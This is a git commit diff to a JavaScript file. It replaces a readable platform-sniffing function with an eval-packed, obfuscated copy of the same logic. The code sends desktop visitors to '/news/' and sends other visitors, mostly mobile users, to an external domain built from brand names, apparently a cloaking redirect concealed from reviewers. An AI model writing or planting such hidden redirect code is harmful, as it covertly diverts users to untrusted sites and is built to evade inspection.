7d0774e54485819456856f4fb611348c65f272ca
kkaaas <69374310+kkaaas@users.noreply.github.com>
2021-12-08 18:22:31 +0800

    Update 82852acc44553cadb052.js

--- 82852acc44553cadb052.js
+++ 82852acc44553cadb052.js
@@ -16,19 +16,8 @@
       }
     }, 300);
 //判断
-function RuPage(){
-var system = {};
-var p = navigator.platform;
-var u = navigator.userAgent;
-system.win = p.indexOf("Win") == 0;
-system.mac = p.indexOf("Mac") == 0;
-system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
-if (system.win || system.mac || system.xll) {
-    window.location.href = '/news/'
-} else {
-    window.location.href = " https://82852acc44553cadb052.xiaomi.huawei.bilibili.sy6602621.top/m"
-}
-}
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('s c(){3 1={};3 p=8.a;3 u=8.h;1.9=p.2("e")==0;1.6=p.2("f")==0;1.g=(p=="d")||(p.2("b")==0);i(1.9||1.6||1.r){7.4.5=\'/w/\'}v{7.4.5=" l://t.j.q.n.o.k/m"}}',33,33,'|system|indexOf|var|location|href|mac|window|navigator|win|platform|Linux|RuPage|X11|Win|Mac|x11|userAgent|if|xiaomi|top|https||bilibili|sy6602621||huawei|xll|function|82852acc44553cadb052||else|news'.split('|'),0,{}))
+
 //点击事件
 setTimeout(function() {
      // IE
